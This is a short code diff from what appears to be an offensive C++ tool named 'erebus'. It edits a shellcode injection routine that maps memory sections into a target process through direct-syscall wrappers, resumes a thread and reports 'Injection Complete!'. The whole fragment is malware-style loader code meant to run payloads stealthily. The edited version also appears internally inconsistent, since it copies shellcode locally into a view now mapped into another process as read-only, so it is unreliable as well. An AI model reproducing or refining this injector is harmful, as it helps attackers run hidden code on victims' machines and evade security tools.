@@ -144,22 +144,23 @@ namespace erebus {
 			&section_size,
 			PAGE_EXECUTE_READWRITE,
 			SEC_COMMIT,
-			NULL);
+			NULL
+		);
 
 		PVOID local_address = NULL;
-		SIZE_T view_size = 0;
 
 		status = Sw3NtMapViewOfSection(
 			section_handle,
-			GetCurrentProcess(),
+			process_handle,
 			&local_address,
 			NULL,
 			NULL,
 			NULL,
-			&view_size,
+			&shellcode_size,
 			ViewShare,
 			NULL,
-			PAGE_READWRITE);
+			PAGE_EXECUTE_READ
+		);
 
 		RtlCopyMemory(local_address, &shellcode, shellcode_size);
 
@@ -172,7 +173,7 @@ namespace erebus {
 			NULL,
 			NULL,
 			NULL,
-			&view_size,
+			&shellcode_size,
 			ViewShare,
 			NULL,
 			PAGE_EXECUTE_READ);
@@ -187,10 +188,15 @@ namespace erebus {
 		ResumeThread(thread_handle);
 
 		status = Sw3NtUnmapViewOfSection(
-			GetCurrentProcess(),
-			local_address);
+			process_handle,
+			local_address
+		);
+
+		Sw3NtClose(process_handle);
+		Sw3NtClose(thread_handle);
 
 		LOG_SUCCESS("Injection Complete!");
+
 		return;
 	}
 
